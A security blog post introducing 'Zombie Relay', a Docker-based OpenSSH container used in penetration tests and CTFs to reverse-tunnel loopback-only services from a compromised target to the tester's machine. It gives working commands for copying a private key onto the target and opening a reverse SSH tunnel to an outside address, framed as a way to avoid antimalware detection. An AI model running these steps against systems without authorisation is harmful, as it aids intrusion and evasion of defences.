---
layout: post
title: Zombie Relay - Temporary relay for Reverse SSH Tunneling
date: 2025-04-19
categories: [blog]
tags: [network, post-exploitation]
---

*An Alpine container for reverse tunneling remote services via SSH without exposing your host. Designed to die and rise again, just like a zombie.*

![](/assets/images/zombierelay_banner_wb1.jpg)

📂 Repository: [Zombie Relay - Github](https://github.com/byt3loss/ZombieRelay)

It is not uncommon to find web services running only on the loopback interface while enumerating a system after gaining a foothold on it during a penetration test (or a CTF). How do you visit them if you don't have access to a browser on the remote host? If you accessed the target via SSH or got an instable reverse shell after exploiting some external service?

The answer to the aforementioned problem is **tunneling**: in simple terms, you set up a tunnel on the target that redirects traffic from your host to the interface and port hosting the local service.

There are various ways to achieve this, but my favorite is using **SSH** because it doesn’t require dropping executables on the target, which could potentially trigger any antimalware or endpoint protection system running on the target machine, even just due to a signature match.

If the target hosts an SSH server and you know some remote user's credentials, you don't need anything else than running the following command on your host.

```sh
ssh -L 8080:127.0.0.1:8080 user@target.htb -N -f
```

However, there are cases where you don't have credentials to access SSH or the target doesn't even have an SSH server running. What can you do then?

You can do it the other way around: make the target initiate an SSH connection to your machine hosting an SSH server, effectively creating a reverse tunnel from the target to your host.

Since giving access to your host to the target is not a good idea, I created **Zombie Relay**, a docker-compose script to build an Alpine container with an OpenSSH server installed. **Designed to die and rise again, just like a zombie**.

- Easy to setup
- Temporary
- Doesn't expose your host file system
- You don't need to drop any noisy executable on the target

## How it works

### Configuration - tuning your zombie

Before building the container, I suggest to take a look at the `docker-compose.yml` file. 

```yml
services:
  zombierelay:
    image: alpine:latest
    ports:
      - "2224:22"
      - "9090:9090"
```

By default only 2 ports are mapped:

- 2224:22 - exposes OpenSSH on your host on port 2224
- 9090:9090 - you will tunnel the remote service through port 9090 of the container and it will be available on port 9090 of your host.

**You can map as many ports as you need**, just append another line to ports (e.g. `- "80:8080"`).

### Raising a zombie

Spawning a Zombie Relay container is as easy as running `docker compose up`.

![](/assets/images/zombierelay_attacker_docker.png)

Everytime you create the container, the compose will automatically create a new private key. Drop it on the target to connect to the container.

Run the following command to copy the key from the container to your host.

```sh
docker cp $(docker ps -l -q):/root/.ssh/id_ed25519 .
```

### Tunnel the remote service to your host

For this part, I set up a Python HTTP server running on port 8080 **locally**. When a local user visits the website root, he receives the message "Internal service only".

![](/assets/images/zombierelay_victim_1.png)

It's now time to drop the zombie's private key on the target and tunnel the local service. Don't forget to **change the file's permissions to 600** (`chmod 600 id_ed25519`). 

Finally, run the ssh command to reverse tunnel the service.

```sh
ssh -i id_ed25519 -p 2224 -R 9090:127.0.0.1:8080 root@10.10.14.20 -N -f
```

In this case, I'm mapping the local service running on port 8080 to the Zombie Relay port 9090, which is mapped on my host on port 9090.

> In my docker-compose file the port is mapped as `8080:9090`

![](/assets/images/zombierelay_victim_2.png)

> The `-N` and `-f` flags, are useful to prevent spawning an SSH session on the container or leaving the remote shell suspended.

### Accessing the remote "internal service only" locally

Lastly, once the remote local service is tunneled to your host, open your browser and navigate to it via the mapped port (9090 in this case).

![](/assets/images/zombierelay_attacker_tunneled_service.png)

### Kill the zombie

Once you no longer need the relay, simply run the following command to stop and remove the latest container created.

```sh
docker stop $(docker ps -l -q) && docker rm $(docker ps -l -q)
```

> BEWARE: If Zombie Relay is not the most recent container created, the command will remove a different container. To avoid this, use the container's name instead (e.g., `zombierelay-zombierelay-1` if you cloned the repo).

## Conclusion

The relay is easy to set up, portable, and (hopefully) stealthier than dropping a binary on the target. A health check is in the works to help with connectivity issues. Suggestions and feedback are more than welcome.

📂 Repository: [Zombie Relay - Github](https://github.com/byt3loss/ZombieRelay)